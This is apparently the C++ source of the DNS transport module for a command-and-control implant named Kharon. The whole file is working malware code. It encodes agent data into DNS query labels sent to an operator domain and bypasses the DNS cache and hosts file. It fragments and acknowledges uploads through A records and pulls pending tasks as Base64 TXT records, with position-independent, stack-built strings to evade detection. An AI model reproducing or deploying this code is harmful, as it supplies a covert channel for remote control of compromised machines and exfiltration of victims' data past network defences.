#include <Kharon.h>

#if PROFILE_C2 == PROFILE_DNS

using namespace Root;

/* ============ [ PIC-safe helpers ] ============ */

static inline CHAR HexNibble( BYTE v ) {
    return (v < 10) ? ('0' + v) : ('a' + v - 10);
}

static ULONG WriteHex32( PCHAR buf, ULONG val ) {
    for ( int i = 7; i >= 0; i-- ) {
        buf[i] = HexNibble( val & 0xF );
        val >>= 4;
    }
    return 8;
}

static ULONG CopyStr( PCHAR dst, PCHAR src ) {
    ULONG i = 0;
    while ( src[i] ) { dst[i] = src[i]; i++; }
    return i;
}

/* ============ [ Base32 encode (PIC-safe) ] ============ */

static ULONG DECLFN DnsBase32Encode( PBYTE in, ULONG inLen, PCHAR out, ULONG outMax ) {
    CHAR B32[33];
    B32[0]='A'; B32[1]='B'; B32[2]='C'; B32[3]='D'; B32[4]='E';
    B32[5]='F'; B32[6]='G'; B32[7]='H'; B32[8]='I'; B32[9]='J';
    B32[10]='K'; B32[11]='L'; B32[12]='M'; B32[13]='N'; B32[14]='O';
    B32[15]='P'; B32[16]='Q'; B32[17]='R'; B32[18]='S'; B32[19]='T';
    B32[20]='U'; B32[21]='V'; B32[22]='W'; B32[23]='X'; B32[24]='Y';
    B32[25]='Z'; B32[26]='2'; B32[27]='3'; B32[28]='4'; B32[29]='5';
    B32[30]='6'; B32[31]='7'; B32[32]='\0';

    ULONG bits = 0, val = 0, idx = 0;
    for ( ULONG i = 0; i < inLen && idx < outMax - 1; i++ ) {
        val = (val << 8) | in[i];
        bits += 8;
        while ( bits >= 5 && idx < outMax - 1 ) {
            out[idx++] = B32[(val >> (bits - 5)) & 0x1F];
            bits -= 5;
        }
    }
    if ( bits > 0 && idx < outMax - 1 ) {
        out[idx++] = B32[(val << (5 - bits)) & 0x1F];
    }
    out[idx] = '\0';
    return idx;
}

/* ============ [ Base64 decode for TXT responses ] ============ */

static ULONG DECLFN B64DecodeDns( PCHAR in, ULONG inLen, PBYTE out, ULONG outMax ) {
    INT inv[80];
    inv[0]=62; inv[1]=-1; inv[2]=-1; inv[3]=-1; inv[4]=63;
    inv[5]=52; inv[6]=53; inv[7]=54; inv[8]=55; inv[9]=56;
    inv[10]=57; inv[11]=58; inv[12]=59; inv[13]=60; inv[14]=61;
    inv[15]=-1; inv[16]=-1; inv[17]=-1; inv[18]=-1; inv[19]=-1;
    inv[20]=-1; inv[21]=-1; inv[22]=0; inv[23]=1; inv[24]=2;
    inv[25]=3; inv[26]=4; inv[27]=5; inv[28]=6; inv[29]=7;
    inv[30]=8; inv[31]=9; inv[32]=10; inv[33]=11; inv[34]=12;
    inv[35]=13; inv[36]=14; inv[37]=15; inv[38]=16; inv[39]=17;
    inv[40]=18; inv[41]=19; inv[42]=20; inv[43]=21; inv[44]=22;
    inv[45]=23; inv[46]=24; inv[47]=25; inv[48]=-1; inv[49]=-1;
    inv[50]=-1; inv[51]=-1; inv[52]=-1; inv[53]=-1; inv[54]=26;
    inv[55]=27; inv[56]=28; inv[57]=29; inv[58]=30; inv[59]=31;
    inv[60]=32; inv[61]=33; inv[62]=34; inv[63]=35; inv[64]=36;
    inv[65]=37; inv[66]=38; inv[67]=39; inv[68]=40; inv[69]=41;
    inv[70]=42; inv[71]=43; inv[72]=44; inv[73]=45; inv[74]=46;
    inv[75]=47; inv[76]=48; inv[77]=49; inv[78]=50; inv[79]=51;

    ULONG decoded = 0;
    for ( ULONG i = 0; i + 3 < inLen; i += 4 ) {
        int a = in[i], b = in[i+1], c = in[i+2], d = in[i+3];
        if ( a < 43 || a > 122 || b < 43 || b > 122 ) break;
        int v0 = inv[a - 43], v1 = inv[b - 43];
        int v2 = (c == '=') ? 0 : inv[c - 43];
        int v3 = (d == '=') ? 0 : inv[d - 43];
        if ( decoded < outMax ) out[decoded++] = (v0 << 2) | (v1 >> 4);
        if ( c != '=' && decoded < outMax ) out[decoded++] = ((v1 & 0xF) << 4) | (v2 >> 2);
        if ( d != '=' && decoded < outMax ) out[decoded++] = ((v2 & 0x3) << 6) | v3;
    }
    return decoded;
}

/* ============ [ Big-endian helpers ] ============ */

static inline void WriteBE32( PBYTE buf, ULONG val ) {
    buf[0] = (BYTE)((val >> 24) & 0xFF);
    buf[1] = (BYTE)((val >> 16) & 0xFF);
    buf[2] = (BYTE)((val >> 8) & 0xFF);
    buf[3] = (BYTE)(val & 0xFF);
}

static inline ULONG ReadBE32( PBYTE buf ) {
    return ((ULONG)buf[0] << 24) | ((ULONG)buf[1] << 16) |
           ((ULONG)buf[2] << 8)  | (ULONG)buf[3];
}

/* ============ [ Build DNS query name ] ============ */
// Format: {SID}.{OP}.{SEQ_HEX}.{PAD}.{DATA_LABELS}.{DOMAIN}

static BOOL DECLFN BuildDnsQuery(
    Root::Kharon* Self,
    PCHAR  sid,     // 8-char agent ID
    PCHAR  op,      // "hi", "put", "get", "hb"
    ULONG  seq,
    PBYTE  data,
    ULONG  dataLen,
    PWCHAR domain,
    PCHAR  outQuery,
    ULONG  outMax
) {
    CHAR b32Buf[512] = { 0 };
    CHAR queryA[300] = { 0 };
    ULONG off = 0;

    ULONG maskedSeq = seq ^ DNS_SEQ_XOR_MASK;

    // SID.OP.SEQ.PAD
    off += CopyStr( queryA + off, sid );
    queryA[off++] = '.';
    off += CopyStr( queryA + off, op );
    queryA[off++] = '.';
    off += WriteHex32( queryA + off, maskedSeq );
    queryA[off++] = '.';

    // PAD (4 random hex chars)
    ULONG rnd = seq + 0x12345;
    rnd = Self->Ntdll.RtlRandomEx( &rnd );
    for ( int i = 3; i >= 0; i-- ) {
        queryA[off + i] = HexNibble( rnd & 0xF );
        rnd >>= 4;
    }
    off += 4;

    // Base32 encode data and split into labels
    ULONG b32Len = 0;
    if ( data && dataLen > 0 ) {
        b32Len = DnsBase32Encode( data, dataLen, b32Buf, sizeof(b32Buf) );
    }

    if ( b32Len > 0 ) {
        ULONG pos = 0;
        while ( pos < b32Len && off < sizeof(queryA) - 60 ) {
            ULONG chunkLen = b32Len - pos;
            if ( chunkLen > DNS_LABEL_LIMIT ) chunkLen = DNS_LABEL_LIMIT;
            queryA[off++] = '.';
            Mem::Copy( queryA + off, b32Buf + pos, chunkLen );
            off += chunkLen;
            pos += chunkLen;
        }
    }

    // Append domain
    queryA[off++] = '.';
    ULONG domIdx = 0;
    while ( domain[domIdx] && off < sizeof(queryA) - 2 ) {
        queryA[off++] = (CHAR)domain[domIdx++];
    }
    queryA[off] = '\0';

    if ( off > 253 ) return FALSE;

    // Copy to output (ASCII for DnsQuery_A)
    for ( ULONG i = 0; i <= off && i < outMax; i++ ) {
        outQuery[i] = queryA[i];
    }

    return TRUE;
}

/* ============ [ DNS A query ] ============ */

static DWORD DECLFN DnsQueryARecord(
    Root::Kharon* Self,
    PVOID queryName
) {
    PDNS_RECORD_KH pRecords = nullptr;

    DNS_STATUS_KH status = Self->Dnsapi.DnsQuery_A(
        (PCSTR)queryName, DNS_TYPE_A,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        nullptr, &pRecords, nullptr
    );

    if ( status != 0 || !pRecords ) {
        if ( pRecords ) Self->Dnsapi.DnsFree( pRecords, DNS_FREE_RECORD_LIST );
        return 0;
    }

    DWORD ipAddr = 0;
    PDNS_RECORD_KH rec = pRecords;
    while ( rec ) {
        if ( rec->wType == DNS_TYPE_A ) {
            ipAddr = rec->Data.A.IpAddress;
            break;
        }
        rec = rec->pNext;
    }

    Self->Dnsapi.DnsFree( pRecords, DNS_FREE_RECORD_LIST );
    return ipAddr;
}

/* ============ [ DNS TXT query ] ============ */

static BOOL DECLFN DnsQueryTXTRecord(
    Root::Kharon* Self,
    PVOID  queryName,
    PBYTE  outBuf,
    ULONG  outMax,
    ULONG* outLen
) {
    PDNS_RECORD_KH pRecords = nullptr;
    *outLen = 0;

    DNS_STATUS_KH status = Self->Dnsapi.DnsQuery_A(
        (PCSTR)queryName, DNS_TYPE_TXT,
        DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
        nullptr, &pRecords, nullptr
    );

    if ( status != 0 || !pRecords ) {
        if ( pRecords ) Self->Dnsapi.DnsFree( pRecords, DNS_FREE_RECORD_LIST );
        return FALSE;
    }

    ULONG pos = 0;
    PDNS_RECORD_KH rec = pRecords;
    while ( rec ) {
        if ( rec->wType == DNS_TYPE_TXT && rec->Data.TXT.pStringData ) {
            PCHAR txt = rec->Data.TXT.pStringData;
            ULONG tlen = 0;
            while ( txt[tlen] ) tlen++;
            if ( pos + tlen < outMax ) {
                Mem::Copy( outBuf + pos, txt, tlen );
                pos += tlen;
            }
        }
        rec = rec->pNext;
    }
    outBuf[pos] = 0;
    *outLen = pos;

    Self->Dnsapi.DnsFree( pRecords, DNS_FREE_RECORD_LIST );
    return pos > 0;
}

/* ============ [ Main DNS Transport ] ============ */

auto DECLFN Transport::DnsSend(
    _In_      MM_INFO* SendData,
    _Out_opt_ MM_INFO* RecvData
) -> BOOL {
    BOOL   Success  = FALSE;
    PCHAR  queryBuf = (PCHAR)KhAlloc( 300 );
    CHAR   sidStr[16] = { 0 };
    PBYTE  payload  = (PBYTE)SendData->Ptr;
    ULONG  payloadLen = (ULONG)SendData->Size;

    if ( !Self->Dnsapi.DnsQuery_A || !Self->Dnsapi.DnsFree || !queryBuf ) {
        if ( queryBuf ) KhFree( queryBuf );
        return FALSE;
    }

    // Derive SID from first 8 chars of AgentID (lowercase)
    if ( Self->Session.AgentID ) {
        Mem::Copy( sidStr, Self->Session.AgentID, 8 );
    }
    sidStr[8] = '\0';
    for ( int i = 0; i < 8; i++ ) {
        if ( sidStr[i] >= 'A' && sidStr[i] <= 'Z' )
            sidStr[i] += 32;
    }

    ULONG seq = this->Dns.SeqCounter++;

    // Operation strings on stack (PIC-safe)
    CHAR opHi[4]  = { 'h', 'i', '\0', '\0' };
    CHAR opPut[4] = { 'p', 'u', 't', '\0' };
    CHAR opGet[4] = { 'g', 'e', 't', '\0' };
    CHAR opHb[4]  = { 'h', 'b', '\0', '\0' };

    if ( ! Self->Session.Connected ) {
        /* ========= [ HI - Checkin ] ========= */
        // Step 1: Send data via PUT fragments
        ULONG fragOff = 0;
        BOOL  complete = FALSE;
        BYTE  fragBuf[256] = { 0 };

        while ( fragOff < payloadLen && !complete ) {
            ULONG chunkLen = payloadLen - fragOff;
            if ( chunkLen > DNS_MAX_FRAG_SIZE ) chunkLen = DNS_MAX_FRAG_SIZE;

            ULONG fragSize = 8 + chunkLen;
            WriteBE32( fragBuf, payloadLen );
            WriteBE32( fragBuf + 4, fragOff );
            Mem::Copy( fragBuf + 8, payload + fragOff, chunkLen );

            ULONG fragSeq = this->Dns.SeqCounter++;
            if ( !BuildDnsQuery( Self, sidStr, opPut, fragSeq,
                                 fragBuf, fragSize, this->Dns.Domain, queryBuf, 300 ) ) {
                fragOff += chunkLen;
                continue;
            }

            DWORD ackIP = DnsQueryARecord( Self, queryBuf );
            PBYTE ipBytes = (PBYTE)&ackIP;
            BYTE flags = ipBytes[0];

            if ( flags & 0x01 ) {
                complete = TRUE;
            } else {
                ULONG nextExp = ((ULONG)ipBytes[1] << 16) |
                                ((ULONG)ipBytes[2] << 8) | (ULONG)ipBytes[3];
                fragOff = nextExp > fragOff ? nextExp : fragOff + chunkLen;
            }
        }

        // Step 2: Send HI to trigger registration
        if ( complete ) {
            ULONG hiSeq = this->Dns.SeqCounter++;
            ULONG hiDataLen = payloadLen < DNS_MAX_FRAG_SIZE ? payloadLen : DNS_MAX_FRAG_SIZE;
            if ( BuildDnsQuery( Self, sidStr, opHi, hiSeq, payload,
                                hiDataLen, this->Dns.Domain, queryBuf, 300 ) ) {
                PBYTE txtBuf = (PBYTE)KhAlloc( 1024 );
                ULONG txtLen = 0;
                if ( DnsQueryTXTRecord( Self, queryBuf, txtBuf, 1024, &txtLen ) && txtLen > 0 ) {
                    PBYTE decoded = (PBYTE)KhAlloc( txtLen );
                    ULONG decodedLen = B64DecodeDns( (PCHAR)txtBuf, txtLen, decoded, txtLen );
                    KhFree( txtBuf );
                    if ( decodedLen > 0 && RecvData ) {
                        RecvData->Ptr  = decoded;
                        RecvData->Size = decodedLen;
                        Success = TRUE;
                    } else {
                        KhFree( decoded );
                    }
                } else {
                    KhFree( txtBuf );
                }
            }
        }

    } else {
        /* ========= [ Connected - PUT + HB + GET ] ========= */

        // PUT: send data via fragments
        if ( payloadLen > 0 ) {
            ULONG fragOff = 0;
            BOOL  complete = FALSE;
            BYTE  putFrag[136] = { 0 };

            while ( fragOff < payloadLen && !complete ) {
                ULONG chunkLen = payloadLen - fragOff;
                if ( chunkLen > DNS_MAX_FRAG_SIZE ) chunkLen = DNS_MAX_FRAG_SIZE;

                ULONG fragSize = 8 + chunkLen;
                WriteBE32( putFrag, payloadLen );
                WriteBE32( putFrag + 4, fragOff );
                Mem::Copy( putFrag + 8, payload + fragOff, chunkLen );

                ULONG fragSeq = this->Dns.SeqCounter++;
                if ( !BuildDnsQuery( Self, sidStr, opPut, fragSeq,
                                     putFrag, fragSize, this->Dns.Domain, queryBuf, 300 ) ) {
                    fragOff += chunkLen;
                    continue;
                }

                DWORD ackIP = DnsQueryARecord( Self, queryBuf );
                PBYTE ipBytes = (PBYTE)&ackIP;
                BYTE flags = ipBytes[0];

                if ( flags & 0x01 ) {
                    complete = TRUE;
                } else {
                    ULONG nextExp = ((ULONG)ipBytes[1] << 16) |
                                    ((ULONG)ipBytes[2] << 8) | (ULONG)ipBytes[3];
                    if ( nextExp > 0 ) {
                        fragOff = nextExp;
                    } else if ( fragOff == 0 ) {
                        fragOff += chunkLen;
                    } else {
                        fragOff = 0;
                    }
                }
            }
        }

        // If no response expected (sending results), return success
        if ( !RecvData ) {
            Success = TRUE;
        } else {
            // HB: check for pending tasks
            BYTE hbData[16] = { 0 };
            ULONG hbSeq = this->Dns.SeqCounter++;
            if ( BuildDnsQuery( Self, sidStr, opHb, hbSeq, hbData, 16,
                                this->Dns.Domain, queryBuf, 300 ) ) {
                DWORD hbIP = DnsQueryARecord( Self, queryBuf );
                PBYTE hbBytes = (PBYTE)&hbIP;
                BYTE  hbFlags = hbBytes[0];

                if ( hbFlags & 0x01 ) {
                    // Tasks pending - GET them
                    ULONG getOff = 0;
                    BOOL  getDone = FALSE;
                    PBYTE fullResp = nullptr;
                    ULONG totalSz = 0;

                    while ( !getDone ) {
                        BYTE getReq[8] = { 0 };
                        WriteBE32( getReq, getOff );

                        ULONG getSeq = this->Dns.SeqCounter++;
                        if ( !BuildDnsQuery( Self, sidStr, opGet, getSeq,
                                             getReq, 8, this->Dns.Domain, queryBuf, 300 ) ) {
                            getDone = TRUE; break;
                        }

                        PBYTE txtBuf = (PBYTE)KhAlloc( 1024 );
                        if ( !txtBuf ) { getDone = TRUE; break; }

                        ULONG txtLen = 0;
                        if ( !DnsQueryTXTRecord( Self, queryBuf, txtBuf, 1024, &txtLen ) || txtLen == 0 ) {
                            KhFree( txtBuf );
                            getDone = TRUE; break;
                        }

                        PBYTE decoded = (PBYTE)KhAlloc( txtLen );
                        if ( !decoded ) { KhFree( txtBuf ); getDone = TRUE; break; }

                        ULONG decodedLen = B64DecodeDns( (PCHAR)txtBuf, txtLen, decoded, txtLen );
                        KhFree( txtBuf );

                        if ( decodedLen < 8 ) { KhFree( decoded ); getDone = TRUE; break; }

                        totalSz = ReadBE32( decoded );
                        ULONG frameOff = ReadBE32( decoded + 4 );
                        ULONG chunkDataLen = decodedLen - 8;

                        if ( !fullResp && totalSz > 0 && totalSz < 0x100000 ) {
                            fullResp = (PBYTE)KhAlloc( totalSz );
                        }

                        if ( fullResp && frameOff + chunkDataLen <= totalSz ) {
                            Mem::Copy( fullResp + frameOff, decoded + 8, chunkDataLen );
                        }

                        getOff = frameOff + chunkDataLen;
                        if ( getOff >= totalSz ) getDone = TRUE;

                        KhFree( decoded );
                    }

                    if ( fullResp && totalSz > 0 && RecvData ) {
                        RecvData->Ptr  = fullResp;
                        RecvData->Size = totalSz;
                        Success = TRUE;
                    } else if ( fullResp ) {
                        KhFree( fullResp );
                    }
                } else {
                    // No pending tasks
                    Success = TRUE;
                    if ( RecvData ) { RecvData->Ptr = nullptr; RecvData->Size = 0; }
                }
            }
        }
    }

    KhFree( queryBuf );
    return Success;
}

#endif // PROFILE_C2 == PROFILE_DNS
